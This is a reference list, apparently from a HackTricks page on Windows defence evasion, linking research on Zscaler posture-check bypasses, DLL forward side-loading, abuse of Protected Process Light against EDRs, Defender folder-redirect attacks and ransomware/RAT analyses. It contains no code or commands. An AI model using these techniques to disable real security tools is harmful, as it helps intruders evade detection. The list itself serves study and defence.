- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)

{{#include ../banners/hacktricks-training.md}}
